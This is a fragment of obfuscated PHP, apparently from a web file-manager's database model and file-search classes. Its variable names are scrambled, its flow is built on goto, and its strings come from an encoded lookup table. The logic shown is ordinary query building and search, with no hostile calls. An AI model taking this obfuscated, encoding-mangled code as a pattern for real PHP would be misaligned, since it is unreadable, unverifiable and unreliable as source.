Fô™≠§ö‹Ì; e´Ø†øí›ô: static $b≤Œã‰∆à˜ = array(); if (!isset($b≤Œã‰∆à˜[$E¬¿äÙ—õ§]) || isset($b≤Œã‰∆à˜[$E¬¿äÙ—õ§]) && $a≈Ωí›´ÿê && $a…Ü‡◊èùÑ[$E¬¿äÙ—õ§] != $a≈Ωí›´ÿê) { if (!empty($a≈Ωí›´ÿê) && is_string($a≈Ωí›´ÿê) && !1 === strpos($a≈Ωí›´ÿê, $b´£ˆÓ±™—[8])) { $a≈Ωí›´ÿê = think_config($a≈Ωí›´ÿê); } $b≤Œã‰∆à˜[$E¬¿äÙ—õ§] = Db::getInstance($a≈Ωí›´ÿê); } elseif (NULL === $a≈Ωí›´ÿê) { $b≤Œã‰∆à˜[$E¬¿äÙ—õ§]->close(); unset($b≤Œã‰∆à˜[$E¬¿äÙ—õ§]); return; } if (!empty($CÉÈ Í∆ûì)) { if (is_string($CÉÈ Í∆ûì)) { parse_str($CÉÈ Í∆ûì, $CÉÈ Í∆ûì); } foreach ($CÉÈ Í∆ûì as $A•öö®ÕÈÏ => $DÕ´ö˘»¯Ó) { $this->setProperty($A•öö®ÕÈÏ, $DÕ´ö˘»¯Ó); } } goto Fä≤ë¡˘Áâ; cÉäÜÇâ©É: $b´£ˆÓ±™— =& $_SERVER[™⁄»üÆ]; if ($b´£ˆÓ±™—[33] === $E¬¿äÙ—õ§ && $this->db) { return $this->db; } static $a…Ü‡◊èùÑ = array(); goto e´Ø†øí›ô; DŸÊàÁ⁄ì“: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $A√Ü‡îØ⁄ö = get_class($this); if ($A√Ü‡îØ⁄ö == $_SERVER[™⁄»üÆ][344]) { return $this->name; } $this->name = substr($A√Ü‡îØ⁄ö, 0, -5); } return $this->name; } public function getTableName() { $A∆–ôòÌÖ  =& $_SERVER[™⁄»üÆ]; if (empty($this->trueTableName)) { $AÂ‹¨åΩúõ = !empty($this->tablePrefix) ? $this->tablePrefix : $A∆–ôòÌÖ [33]; if (!empty($this->tableName)) { $AÂ‹¨åΩúõ .= $this->tableName; } else { $AÂ‹¨åΩúõ .= think_parse_name($this->name); } $this->trueTableName = strtolower($AÂ‹¨åΩúõ); } return (!empty($this->dbName) ? $this->dbName . $A∆–ôòÌÖ [95] : $A∆–ôòÌÖ [33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $eóñÛ⁄å≠Â =& $_SERVER[™⁄»üÆ]; return isset($this->fields[$eóñÛ⁄å≠Â[249]]) ? $this->fields[$eóñÛ⁄å≠Â[249]] : $this->pk; } public function getDbFields() { $B†ÀÜ£⁄€Ë =& $_SERVER[™⁄»üÆ]; if (isset($this->options[$B†ÀÜ£⁄€Ë[277]])) { $B…ﬁß€÷ö¢ = $this->db->getFields($this->options[$B†ÀÜ£⁄€Ë[277]]); return $B…ﬁß€÷ö¢ ? array_keys($B…ﬁß€÷ö¢) : !1; } if ($this->fields) { $B…ﬁß€÷ö¢ = $this->fields; unset($B…ﬁß€÷ö¢[$B†ÀÜ£⁄€Ë[248]], $B…ﬁß€÷ö¢[$B†ÀÜ£⁄€Ë[249]], $B…ﬁß€÷ö¢[$B†ÀÜ£⁄€Ë[250]], $B…ﬁß€÷ö¢[$B†ÀÜ£⁄€Ë[247]]); return $B…ﬁß€÷ö¢; } return !1; } public function data($eÙ—Œ»±∞Ç = '') { $c†∑µÀ¯∂¥ =& $_SERVER[™⁄»üÆ]; if ($c†∑µÀ¯∂¥[33] === $eÙ—Œ»±∞Ç && !empty($this->data)) { return $this->data; } if (is_object($eÙ—Œ»±∞Ç)) { $eÙ—Œ»±∞Ç = get_object_vars($eÙ—Œ»±∞Ç); } elseif (is_string($eÙ—Œ»±∞Ç)) { parse_str($eÙ—Œ»±∞Ç, $eÙ—Œ»±∞Ç); } elseif (!is_array($eÙ—Œ»±∞Ç)) { think_exception(think_lang($c†∑µÀ¯∂¥[269])); } $this->data = $eÙ—Œ»±∞Ç; return $this; } public function join($dœŸÕÖ≥πå) { $B±™ﬁïπû’ =& $_SERVER[™⁄»üÆ]; if (is_array($dœŸÕÖ≥πå)) { $this->options[$B±™ﬁïπû’[280]] = $dœŸÕÖ≥πå; } elseif (!empty($dœŸÕÖ≥πå)) { $this->options[$B±™ﬁïπû’[280]][] = $dœŸÕÖ≥πå; } return $this; } public function union($A–æÎÍ—ºÙ, $bﬁç¡ôÉÓË = false) { goto dµéøÒ√°¢; dµéøÒ√°¢: $A˜¯ªÂÊ√ç =& $_SERVER[™⁄»üÆ]; if (empty($A–æÎÍ—ºÙ)) { return $this; } if ($bﬁç¡ôÉÓË) { $this->options[$A˜¯ªÂÊ√ç[345]][$A˜¯ªÂÊ√ç[346]] = !0; } goto Aﬂ◊√ÌıÕÇ; f…£„‹ÇÎ–: return $this; goto EùíçΩäô¬; Aﬂ◊√ÌıÕÇ: if (is_object($A–æÎÍ—ºÙ)) { $A–æÎÍ—ºÙ = get_object_vars($A–æÎÍ—ºÙ); } if (is_string($A–æÎÍ—ºÙ)) { $cÔÜ√ó™÷≥ = $A–æÎÍ—ºÙ; } elseif (is_array($A–æÎÍ—ºÙ)) { if (isset($A–æÎÍ—ºÙ[0])) { $this->options[$A˜¯ªÂÊ√ç[345]] = array_merge($this->options[$A˜¯ªÂÊ√ç[345]], $A–æÎÍ—ºÙ); return $this; } else { $cÔÜ√ó™÷≥ = $A–æÎÍ—ºÙ; } } else { think_exception(think_lang($A˜¯ªÂÊ√ç[269])); } $this->options[$A˜¯ªÂÊ√ç[345]][] = $cÔÜ√ó™÷≥; goto f…£„‹ÇÎ–; EùíçΩäô¬: } public function cache($aÆ∑‹◊…óÁ = true, $F¿úë°°Ω∂ = null, $DÉ«ı°˜öæ = '') { $EµØãÏÎöã =& $_SERVER[™⁄»üÆ]; if (!1 !== $aÆ∑‹◊…óÁ) { $this->options[$EµØãÏÎöã[347]] = array($EµØãÏÎöã[93] => $aÆ∑‹◊…óÁ, $EµØãÏÎöã[337] => $F¿úë°°Ω∂, $EµØãÏÎöã[29] => $DÉ«ı°˜öæ); } return $this; } public function field($D¬Ωä£‡‘à, $A©Êééæ˘§ = false) { $f√©£¡»ö† =& $_SERVER[™⁄»üÆ]; if (!0 === $D¬Ωä£‡‘à) { $d‡ØŒÿ∞≥Ú = $this->getDbFields(); $D¬Ωä£‡‘à = $d‡ØŒÿ∞≥Ú ? $d‡ØŒÿ∞≥Ú : $f√©£¡»ö†[182]; } elseif ($A©Êééæ˘§) { if (is_string($D¬Ωä£‡‘à)) { $D¬Ωä£‡‘à = explode($f√©£¡»ö†[47], $D¬Ωä£‡‘à); } $d‡ØŒÿ∞≥Ú = $this->getDbFields(); $D¬Ωä£‡‘à = $d‡ØŒÿ∞≥Ú ? array_diff($d‡ØŒÿ∞≥Ú, $D¬Ωä£‡‘à) : $D¬Ωä£‡‘à; } $this->options[$f√©£¡»ö†[271]] = $D¬Ωä£‡‘à; return $this; } public function scope($D€óªÎãÔ = '', $d≤ó–Ÿ≈¶£ = NULL) { $cô⁄„√Ú∏Ç =& $_SERVER[™⁄»üÆ]; if ($cô⁄„√Ú∏Ç[33] === $D€óªÎãÔ) { if (isset($this->_scope[$cô⁄„√Ú∏Ç[34]])) { $aœƒÜì®ßÜ = $this->_scope[$cô⁄„√Ú∏Ç[34]]; } else { return $this; } } elseif (is_string($D€óªÎãÔ)) { $e”õÑΩÜåÂ = explode($cô⁄„√Ú∏Ç[47], $D€óªÎãÔ); $aœƒÜì®ßÜ = array(); foreach ($e”õÑΩÜåÂ as $B”‡•†”ˆ∞) { if (!isset($this->_scope[$B”‡•†”ˆ∞])) { continue; } $aœƒÜì®ßÜ = array_merge($aœƒÜì®ßÜ, $this->_scope[$B”‡•†”ˆ∞]); } if (!empty($d≤ó–Ÿ≈¶£) && is_array($d≤ó–Ÿ≈¶£)) { $aœƒÜì®ßÜ = array_merge($aœƒÜì®ßÜ, $d≤ó–Ÿ≈¶£); } } elseif (is_array($D€óªÎãÔ)) { $aœƒÜì®ßÜ = $D€óªÎãÔ; } if (is_array($aœƒÜì®ßÜ) && !empty($aœƒÜì®ßÜ)) { $this->options = array_merge($this->options, array_change_key_case($aœƒÜì®ßÜ)); } return $this; } public function where($AëÌ∆ﬁ∞ßô, $AèÀŒËÌê = null) { $d¥ò¯âéŸ∏ =& $_SERVER[™⁄»üÆ]; if (!is_null($AèÀŒËÌê) && is_string($AëÌ∆ﬁ∞ßô)) { if (!is_array($AèÀŒËÌê)) { $AèÀŒËÌê = func_get_args(); array_shift($AèÀŒËÌê); } $AèÀŒËÌê = array_map(array($this->db, $d¥ò¯âéŸ∏[341]), $AèÀŒËÌê); $AëÌ∆ﬁ∞ßô = vsprintf($AëÌ∆ﬁ∞ßô, $AèÀŒËÌê); } elseif (is_object($AëÌ∆ﬁ∞ßô)) { $AëÌ∆ﬁ∞ßô = get_object_vars($AëÌ∆ﬁ∞ßô); } elseif (is_array($AëÌ∆ﬁ∞ßô)) { foreach ($AëÌ∆ﬁ∞ßô as $D§ÛßÚﬂ∏Ö => $FπüÓ˜–äû) { if ((is_numeric($D§ÛßÚﬂ∏Ö) || !$D§ÛßÚﬂ∏Ö) && is_string($FπüÓ˜–äû)) { if (strpos($FπüÓ˜–äû, $d¥ò¯âéŸ∏[348]) === 0) { continue; } think_trace($d¥ò¯âéŸ∏[349], $d¥ò¯âéŸ∏[33], $d¥ò¯âéŸ∏[46]); die; } } } if (is_string($AëÌ∆ﬁ∞ßô) && $d¥ò¯âéŸ∏[33] != $AëÌ∆ﬁ∞ßô) { $cÒ—≤¡π∂Ô = array(); $cÒ—≤¡π∂Ô[$d¥ò¯âéŸ∏[350]] = $AëÌ∆ﬁ∞ßô; $AëÌ∆ﬁ∞ßô = $cÒ—≤¡π∂Ô; } if (isset($this->options[$d¥ò¯âéŸ∏[273]])) { $this->options[$d¥ò¯âéŸ∏[273]] = array_merge($this->options[$d¥ò¯âéŸ∏[273]], $AëÌ∆ﬁ∞ßô); } else { $this->options[$d¥ò¯âéŸ∏[273]] = $AëÌ∆ﬁ∞ßô; } return $this; } public function limit($d÷€à„æâ´, $CëâØƒ∆çù = null) { $d∑ÉˆÁµ◊ÿ =& $_SERVER[™⁄»üÆ]; $this->options[$d∑ÉˆÁµ◊ÿ[290]] = is_null($CëâØƒ∆çù) ? $d÷€à„æâ´ : $d÷€à„æâ´ . $d∑ÉˆÁµ◊ÿ[47] . $CëâØƒ∆çù; return $this; } public function page($dç≤œ‹±πé, $B¿Í¥úìÍä = null) { $AËï—∫§àÑ =& $_SERVER[™⁄»üÆ]; $this->options[$AËï—∫§àÑ[351]] = is_null($B¿Í¥úìÍä) ? $dç≤œ‹±πé : $dç≤œ‹±πé . $AËï—∫§àÑ[47] . $B¿Í¥úìÍä; return $this; } public function comment($bœ–é«ö„◊) { $this->options[$_SERVER[™⁄»üÆ][352]] = $bœ–é«ö„◊; return $this; } public function setProperty($AØâÇÿ‹ŸÍ, $Cßé∫¿Â¡ ) { if (property_exists($this, $AØâÇÿ‹ŸÍ)) { $this->{$AØâÇÿ‹ŸÍ} = $Cßé∫¿Â¡ ; } return $this; } } goto dı–ôõﬂÒ¢; eÜíÜîí—µ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($C¥êﬁˆ‰ë©) { goto F©äŸ∏ßÇ’; DÌπ›œÿ¨ò: if (!$c«äÍâ∏Ñ°) { return array(); } $A£ä¥≈çœ“ = $c«äÍâ∏Ñ°[$BÓÊ£¯åÔ[168]]; $cÊÿá∑∞•Ø = $BÓÊ£¯åÔ[7]; goto C€…ûØ¿ù≈; C€…ûØ¿ù≈: if (!$c«äÍâ∏Ñ°[$BÓÊ£¯åÔ[168]]) { $e∂Ñ∞éàÉç = array_to_keyvalue($e»›‰ÂÍà“, $BÓÊ£¯åÔ[33], $BÓÊ£¯åÔ[168]); $A£ä¥≈çœ“ = implode($BÓÊ£¯åÔ[47], $e∂Ñ∞éàÉç); $cÊÿá∑∞•Ø = $BÓÊ£¯åÔ[1950]; } $E¬øâ›öÏ´ = explode($BÓÊ£¯åÔ[47], trim($A£ä¥≈çœ“, $BÓÊ£¯åÔ[47])); return array($cÊÿá∑∞•Ø, $E¬øâ›öÏ´); goto cÆÎö®ê‡á; F©äŸ∏ßÇ’: $BÓÊ£¯åÔ =& $_SERVER[™⁄»üÆ]; $e»›‰ÂÍà“ = KodIO::fileTypeList(); $c«äÍâ∏Ñ° = $e»›‰ÂÍà“[$C¥êﬁˆ‰ë©]; goto DÌπ›œÿ¨ò; cÆÎö®ê‡á: } public function listPathType($cÉäÀÏ—ê—) { $F«öÎÙÃëı =& $_SERVER[™⁄»üÆ]; $d ı◊’ŸÈÕ = $this->fileTypeWhere($cÉäÀÏ—ê—); if (!$d ı◊’ŸÈÕ) { return array(); } $aù◊ñ€‘À÷ = array($F«öÎÙÃëı[563] => SourceModel::TYPE_USER, $F«öÎÙÃëı[564] => USER_ID, $F«öÎÙÃëı[560] => 0, $F«öÎÙÃëı[561] => $d ı◊’ŸÈÕ); return $this->listSource($aù◊ñ€‘À÷); } public function listSearch($e≠øÙ¯ã¢Ω, $fêºÖÎ”ã” = 300) { goto B˘Éß∆≈›∏; bÏöŸÿäﬁ¬: $this->_listMake($c˘∫Ó¬ä·∂); return $c˘∫Ó¬ä·∂; goto D¶‰”»íóç; B˘Éß∆≈›∏: $fÎ«æâ“ìÁ =& $_SERVER[™⁄»üÆ]; if (isset($e≠øÙ¯ã¢Ω[$fÎ«æâ“ìÁ[1794]]) && $e≠øÙ¯ã¢Ω[$fÎ«æâ“ìÁ[1794]]) { $e≠øÙ¯ã¢Ω[$fÎ«æâ“ìÁ[1794]] = str_replace($fÎ«æâ“ìÁ[381], $fÎ«æâ“ìÁ[1951], trim($e≠øÙ¯ã¢Ω[$fÎ«æâ“ìÁ[1794]])); } $F∆Á∏ò∆…õ = $this->_parseSearchWhere($e≠øÙ¯ã¢Ω); goto DÑåÎ√ãû©; DÑåÎ√ãû©: if (!isset($F∆Á∏ò∆…õ[$fÎ«æâ“ìÁ[424]])) { $F∆Á∏ò∆…õ[$fÎ«æâ“ìÁ[424]] = 0; } $D¶ ëïæŒ¿ = $fÎ«æâ“ìÁ[1952]; $eıçµ®¡®≈ = $D¶ ëïæŒ¿; goto b›Ê≠Ñ∑ÚÍ; b›Ê≠Ñ∑ÚÍ: $this->_listSearchBindPinyin($e≠øÙ¯ã¢Ω, $F∆Á∏ò∆…õ, $D¶ ëïæŒ¿); $this->alias($fÎ«æâ“ìÁ[530])->_makeOrder(); $F∆Á∏ò∆…õ = $this->parseWhereLike($F∆Á∏ò∆…õ); goto BÃ¡®—Ñ¶”; EÁæÌ•îµ‡: $this->_listSearchTag($c˘∫Ó¬ä·∂, $e≠øÙ¯ã¢Ω, $eıçµ®¡®≈); $this->_listSearchGroupTag($c˘∫Ó¬ä·∂, $e≠øÙ¯ã¢Ω, $eıçµ®¡®≈); $this->_listDataApply($c˘∫Ó¬ä·∂[$fÎ«æâ“ìÁ[367]]); goto bÏöŸÿäﬁ¬; BÃ¡®—Ñ¶”: $c˘∫Ó¬ä·∂ = $this->distinct(!0)->field($D¶ ëïæŒ¿)->where($F∆Á∏ò∆…õ)->selectPage($fêºÖÎ”ã”); $this->_listSearchFileContent($c˘∫Ó¬ä·∂, $e≠øÙ¯ã¢Ω, $eıçµ®¡®≈); $this->_listSearchDesc($c˘∫Ó¬ä·∂, $e≠øÙ¯ã¢Ω, $eıçµ®¡®≈); goto EÁæÌ•îµ‡; D¶‰”»íóç: } private function _listSearchFileContent(&$bãÑáíÃ£∆, $f†£éçûÚ·, $c√Âûò◊ö∆) { goto e≠Ùü€≥ÿŒ; e≠Ùü€≥ÿŒ: $F≥§Ÿ¿ı˜‡ =& $_SERVER[™⁄»üÆ]; if (!$f†£éçûÚ·[$F≥§Ÿ¿ı˜‡[1794]] || $bãÑáíÃ£∆[$F≥§Ÿ¿ı˜‡[364]][$F≥§Ÿ¿ı˜‡[351]] > 1) { return; } $b≤È∂∞†◊¨ = $this->_parseSearchWhere($f†£éçûÚ·); goto C©ÂÔÙë¡¢; a›ÊÎè°‘ﬁ: unset($f†£éçûÚ·[$F≥§Ÿ¿ı˜‡[448]]); $déŸßØ£©õ = $this->field($c√Âûò◊ö∆)->where($b≤È∂∞†◊¨)->limit($F≥§Ÿ¿ı˜‡[1953])->select(); if (!$déŸßØ£©õ || count($déŸßØ£©õ) == 0) { return; } goto bè∑ôº∑±µ; C©ÂÔÙë¡¢: if (!isset($b≤È∂∞†◊¨[$F≥§Ÿ¿ı˜‡[28]]) || !is_array($f†£éçûÚ·[$F≥§Ÿ¿ı˜‡[448]])) { return; } $b≤È∂∞†◊¨[$F≥§Ÿ¿ı˜‡[448]] = array($F≥§Ÿ¿ı˜‡[7], $f†£éçûÚ·[$F≥§Ÿ¿ı˜‡[448]]); unset($b≤È∂∞†◊¨[$F≥§Ÿ¿ı˜‡[28]]); goto a›ÊÎè°‘ﬁ; bè∑ôº∑±µ: $bãÑáíÃ£∆[$F≥§Ÿ¿ı˜‡[367]] = array_merge($déŸßØ£©õ, $bãÑáíÃ£∆[$F≥§Ÿ¿ı˜‡[367]]); $bãÑáíÃ£∆[$F≥§Ÿ¿ı˜‡[364]][$F≥§Ÿ¿ı˜‡[365]] += count($déŸßØ£©õ); goto bâñã¶ıó‰; bâñã¶ıó‰: } private function _listSearchTag(&$E∆√èÏÇÿ∂, $dïπ≠‚ÒﬂÜ, $F§Ã”À∏„Ω) { goto aÕ¥ﬂßã÷Ü; fù∆îå‘æ¶: if (!$cƒÜø»õı¿) { return; } $f»∏◊›Ñºß = array($c®çÃô›⁄‡[420] => array($c®çÃô›⁄‡[7], $cƒÜø»õı¿), $c®çÃô›⁄‡[1537] => USER_ID); $EÛéÏéø÷ö = Model($c®çÃô›⁄‡[421])->field($c®çÃô›⁄‡[76])->where($f»∏◊›Ñºß)->select(); goto C¢êßñ•Áº; F„˘áíÊèÎ: $cƒÜø»õı¿ = array(); $dàÇı–àãË = $dïπ≠‚ÒﬂÜ[$c®çÃô›⁄‡[1794]]; foreach ($aíåÖ¿êÎÙ as $d›©‚É∑¬ç) { $E≥ä†©ı”´ = $d›©‚É∑¬ç[$c®çÃô›⁄‡[28]]; $Aìëå”€ÏΩ = str_replace($c®çÃô›⁄‡[50], $c®çÃô›⁄‡[33], Pinyin::encode($E≥ä†©ı”´)); if (stripos($E≥ä†©ı”´, $dàÇı–àãË) !== !1 || stripos($Aìëå”€ÏΩ, $dàÇı–àãË) !== !1) { $cƒÜø»õı¿[] = $d›©‚É∑¬ç[$c®çÃô›⁄‡[394]]; } } goto fù∆îå‘æ¶; C¢êßñ•Áº: $EÛéÏéø÷ö = array_to_keyvalue($EÛéÏéø÷ö, $c®çÃô›⁄‡[33], $c®çÃô›⁄‡[76]); $fÚ»ˆ∫”íà = array_unique($EÛéÏéø÷ö); $this->_listSearchMerge($E∆√èÏÇÿ∂, $dïπ≠‚ÒﬂÜ, $F§Ã”À∏„Ω, $fÚ»ˆ∫”íà); goto E≈üËà˜ï—; aÕ¥ﬂßã÷Ü: $c®çÃô›⁄‡ =& $_SERVER[™⁄»üÆ]; if (!$dïπ≠‚ÒﬂÜ[$c®çÃô›⁄‡[1794]] || $E∆√èÏÇÿ∂[$c®çÃô›⁄‡[364]][$c®çÃô›⁄‡[351]] > 1) { return; } $aíåÖ¿êÎÙ = Model($c®çÃô›⁄‡[1954])->listData(); goto F„˘áíÊèÎ; E≈üËà˜ï—: } private function _listSearchDesc(&$eÙﬂßˆãÍ¡, $Cˆå·ô˜Íá, $e‘ÌåéÖúà) { goto c›àÉÛüÎ’; AèÁ¯“ûÂ∞: $A±éäûœ∞á = Model($d‹•Ø‡‡ﬁﬁ[546])->field($d‹•Ø‡‡ﬁﬁ[396])->where($a÷›Íé›ç€)->select(); $cƒÖŒ·∞‰Î = array_to_keyvalue($A±éäûœ∞á, $d‹•Ø‡‡ﬁﬁ[33], $d‹•Ø‡‡ﬁﬁ[396]); $this->_listSearchMerge($eÙﬂßˆãÍ¡, $Cˆå·ô˜Íá, $e‘ÌåéÖúà, $cƒÖŒ·∞‰Î); goto cÌ°ŸÒÉ…è; c›àÉÛüÎ’: $d‹•Ø‡‡ﬁﬁ =& $_SERVER[™⁄»üÆ]; if (!$Cˆå·ô˜Íá[$d‹•Ø‡‡ﬁﬁ[1794]] || $eÙﬂßˆãÍ¡[$d‹•Ø‡‡ﬁﬁ[364]][$d‹•Ø‡‡ﬁﬁ[351]] > 1) { return; } $Cç´‡È‡∞Ù = $this->listSearchChildren($Cˆå·ô˜Íá[$d‹•Ø‡‡ﬁﬁ[479]]); goto C‚πÇ⁄‚éÎ; C‚πÇ⁄‚éÎ: $Cç´‡È‡∞Ù = array_unique($Cç´‡È‡∞Ù); if (!$Cç´‡È‡∞Ù) { return; } $a÷›Íé›ç€ = array($d‹•Ø‡‡ﬁﬁ[396] => array($d‹•Ø‡‡ﬁﬁ[7], $Cç´‡È‡∞Ù), $d‹•Ø‡‡ﬁﬁ[93] => $d‹•Ø‡‡ﬁﬁ[432], $d‹•Ø‡‡ﬁﬁ[372] => array($d‹•Ø‡‡ﬁﬁ[380], $d‹•Ø‡‡ﬁﬁ[1796] . $Cˆå·ô˜Íá[$d‹•Ø‡‡ﬁﬁ[1794]] . $d‹•Ø‡‡ﬁﬁ[1796])); goto AèÁ¯“ûÂ∞; cÌ°ŸÒÉ…è: } private function _listSearchGroupTag(&$C·Ïé±ãœ™, $A’⁄ã˜⁄õ, $C≈ß∏–ãÿü) { goto dîâ√‰û•â; E·÷¯≠›«: if (!$B“∆Éêºﬂæ || $B“∆Éêºﬂæ[$AÜ‡⁄üÌÑù[405]] != SourceModel::TYPE_GROUP) { return; } $c¨∑¥ÇÌÌﬁ = $B“∆Éêºﬂæ[$AÜ‡⁄üÌÑù[485]]; $F≠ê‰ñÙí¬ = Model($AÜ‡⁄üÌÑù[1955])->get($c¨∑¥ÇÌÌﬁ); goto Bÿ—áçŒâì; Bÿ—áçŒâì: $b≈ÙÊ≠Û·Û = array(); $e§–ëïÎﬁø = $A’⁄ã˜⁄õ[$AÜ‡⁄üÌÑù[1794]]; foreach ($F≠ê‰ñÙí¬[$AÜ‡⁄üÌÑù[367]] as $cµ‹û¥ò‹á) { $dã“˘‡Ûﬂë = $cµ‹û¥ò‹á[$AÜ‡⁄üÌÑù[28]]; $F™ñﬁ¿”±ò = str_replace($AÜ‡⁄üÌÑù[50], $AÜ‡⁄üÌÑù[33], Pinyin::encode($dã“˘‡Ûﬂë)); if (stripos($dã“˘‡Ûﬂë, $e§–ëïÎﬁø) !== !1 || stripos($F™ñﬁ¿”±ò, $e§–ëïÎﬁø) !== !1) { $b≈ÙÊ≠Û·Û[] = $cµ‹û¥ò‹á[$AÜ‡⁄üÌÑù[394]]; } } goto a∑ºóï¿—Ü; dîâ√‰û•â: $AÜ‡⁄üÌÑù =& $_SERVER[™⁄»üÆ]; if (!$A’⁄ã˜⁄õ[$AÜ‡⁄üÌÑù[1794]] || $C·Ïé±ãœ™[$AÜ‡⁄üÌÑù[364]][$AÜ‡⁄üÌÑù[351]] > 1 || !$A’⁄ã˜⁄õ[$AÜ‡⁄üÌÑù[479]]) { return; } $B“∆Éêºﬂæ = $this->sourceInfo($A’⁄ã˜⁄õ[$AÜ‡⁄üÌÑù[479]]); goto E·÷¯≠›«; a∑ºóï¿—Ü: if (!$b≈ÙÊ≠Û·Û) { return; } $Eî∞≈‰ö–ã = array($AÜ‡⁄üÌÑù[420] => array($AÜ‡⁄üÌÑù[7], $b≈ÙÊ≠Û·Û), $AÜ‡⁄üÌÑù[1537] => 0, $AÜ‡⁄üÌÑù[29] => $AÜ‡⁄üÌÑù[1818] . $c¨∑¥ÇÌÌﬁ); $dµÆìï∏Á™ = Model($AÜ‡⁄üÌÑù[421])->field($AÜ‡⁄üÌÑù[76])->where($Eî∞≈‰ö–ã)->select(); goto f˘  ‚≤íΩ; f˘  ‚≤íΩ: $dµÆìï∏Á™ = array_to_keyvalue($dµÆìï∏Á™, $AÜ‡⁄üÌÑù[33], $AÜ‡⁄üÌÑù[76]); $EŸô∞ıﬁ†ô = array_unique($dµÆìï∏Á™); $this->_listSearchMerge($C·Ïé±ãœ™, $A’⁄ã˜⁄õ, $C≈ß∏–ãÿü, $EŸô∞ıﬁ†ô); goto E≠ß˘Ì¥òæ; E≠ß˘Ì¥òæ: } private function _listSearchMerge(&$Dø‹ÖÖ≤íÖ, $a•∑à’Ç˘›, $C °§Ìåı±, $eë‰ô£≠éË) { goto bÖñˆÒ¶Ô◊; b«üÆﬁÍŸÉ: $Báºµ§ù§≥ = $this->field($C °§Ìåı±)->where($bØ£ûúı›¥)->select(); if (!$Báºµ§ù§≥) { return; } $e…·ïÈÌ®· = array(); goto FÕØΩëﬂÊ„; e’®ìÊãÖº: $CÜ¯Æﬁã’ç = array_diff($eë‰ô£≠éË, $fâØ¨π›åÛ); if (!$CÜ¯Æﬁã’ç) { return; } $bØ£ûúı›¥ = array($aååúúı•≈[396] => array($aååúúı•≈[7], $CÜ¯Æﬁã’ç)); goto b«üÆﬁÍŸÉ; bÖñˆÒ¶Ô◊: $aååúúı•≈ =& $_SERVER[™⁄»üÆ]; if (!$eë‰ô£≠éË) { return; } $fâØ¨π›åÛ = array_to_keyvalue($Dø‹ÖÖ≤íÖ[$aååúúı•≈[367]], $aååúúı•≈[33], $aååúúı•≈[396]); goto e’®ìÊãÖº; FÕØΩëﬂÊ„: foreach ($Báºµ§ù§≥ as $Fñ¡ﬂ¢≠ò€) { if ($this->_listSearchFilter($Fñ¡ﬂ¢≠ò€, $a•∑à’Ç˘›)) { $e…·ïÈÌ®·[] = $Fñ¡ﬂ¢≠ò€; } } $Dø‹ÖÖ≤íÖ[$aååúúı•≈[367]] = array_merge($e…·ïÈÌ®·, $Dø‹ÖÖ≤íÖ[$aååúúı•≈[367]]); $Dø‹ÖÖ≤íÖ[$aååúúı•≈[364]][$aååúúı•≈[365]] += count($e…·ïÈÌ®·); goto aãñòÓÒ“µ; aãñòÓÒ“µ: } private function _listSearchFilter($câ“Ü´òıÕ, $CÏÖ‹á≤ñè) { goto F‘Ç∫π©Ùß; F‘Ç∫π©Ùß: $aá’ıﬂé√Ó =& $_SERVER[™⁄»üÆ]; $B…ÓéŒıÒµ = $câ“Ü´òıÕ[$aá’ıﬂé√Ó[404]] == $aá’ıﬂé√Ó[87]; if (!strstr($câ“Ü´òıÕ[$aá’ıﬂé√Ó[503]], $aá’ıﬂé√Ó[47] . $CÏÖ‹á≤ñè[$aá’ıﬂé√Ó[479]] . $aá’ıﬂé√Ó[47])) { return !1; } goto aÂ≈õÇ¶ç˜; c›“ë¿—≥è: if (isset($CÏÖ‹á≤ñè[$aá’ıﬂé√Ó[576]]) && $CÏÖ‹á≤ñè[$aá’ıﬂé√Ó[576]] != $câ“Ü´òıÕ[$aá’ıﬂé√Ó[435]]) { return !1; } return !0; goto Bï†‹Õ∏¢ ; aÂ≈õÇ¶ç˜: if (isset($CÏÖ‹á≤ñè[$aá’ıﬂé√Ó[406]]) && $CÏÖ‹á≤ñè[$aá’ıﬂé√Ó[406]] != $aá’ıﬂé√Ó[1760]) { if ($CÏÖ‹á≤ñè[$aá’ıﬂé√Ó[406]] == $aá’ıﬂé√Ó[77] && !$B…ÓéŒıÒµ) { return !1; } if ($CÏÖ‹á≤ñè[$aá’ıﬂé√Ó[406]] != $aá’ıﬂé√Ó[77] && $B…ÓéŒıÒµ) { return !1; } if (!strstr($câ“Ü´òıÕ[$aá’ıﬂé√Ó[168]], $aá’ıﬂé√Ó[47] . $CÏÖ‹á≤ñè[$aá’ıﬂé√Ó[406]] . $aá’ıﬂé√Ó[47])) { return !1; } } if (isset($CÏÖ‹á≤ñè[$aá’ıﬂé√Ó[1956]]) && $CÏÖ‹á≤ñè[$aá’ıﬂé√Ó[1956]] < $câ“Ü´òıÕ[$aá’ıﬂé√Ó[78]]) { return !1; } if (isset($CÏÖ‹á≤ñè[$aá’ıﬂé√Ó[1957]]) && $CÏÖ‹á≤ñè[$aá’ıﬂé√Ó[1957]] > $câ“Ü´òıÕ[$aá’ıﬂé√Ó[78]]) { return !1; } goto c›“ë¿—≥è; Bï†‹Õ∏¢ : } public function listSearchChildren($E–äπ≤ÍÉã, $cã¶Íÿ∂Ô» = 5000) { goto cçËèá¶Ë®; cçËèá¶Ë®: $D˜à”∏ﬁ´⁄ =& $_SERVER[™⁄»üÆ]; $F»ºã®Ç‹í = array(); $A’Ì¡Ú´Ù¨ = $this->sourceInfo($E–äπ≤ÍÉã); goto B‹∫¬‰ûèÆ; Dû°Ææ∑Öë: $AËø«Ï Çó = $this->field($D˜à”∏ﬁ´⁄[396])->where($Dı¯éÛ˘Ò≤)->select(); $F»ºã®Ç‹í = array_to_keyvalue($AËø«Ï Çó, $D˜à”∏ﬁ´⁄[33], $D˜à”∏ﬁ´⁄[396]); return $F»ºã®Ç‹í; goto e¯∫∞ΩàÍ€; B‹∫¬‰ûèÆ: $Dı¯éÛ˘Ò≤ = array($D˜à”∏ﬁ´⁄[503] => array($D˜à”∏ﬁ´⁄[380], $A’Ì¡Ú´Ù¨[$D˜à”∏ﬁ´⁄[503]] . $A’Ì¡Ú´Ù¨[$D˜à”∏ﬁ´⁄[396]] . 